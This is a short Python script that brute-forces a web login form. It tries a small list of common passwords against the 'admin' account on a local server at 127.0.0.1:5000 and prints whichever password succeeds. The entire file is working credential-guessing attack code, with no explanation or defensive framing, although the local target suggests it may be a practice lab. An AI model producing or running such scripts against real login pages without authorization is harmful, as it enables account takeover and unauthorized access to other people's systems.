import requests

# URL of the login page
url = "http://127.0.0.1:5000/login"

# A dictionary of common passwords to try
password_list = [
    "123456",
    "password",
    "admin",
    "password123",
    "qwerty",
    "letmein",
]

# The username to brute force
username = "admin"

# Loop through the password list
for password in password_list:
    # Send a POST request to the login page
    response = requests.post(url, data={"username": username, "password": password})

    # Check if login was successful
    if "Login successful" in response.text:
        print(f"Success! Username: {username}, Password: {password}")
        break
    else:
        print(f"Failed attempt: {username}:{password}")
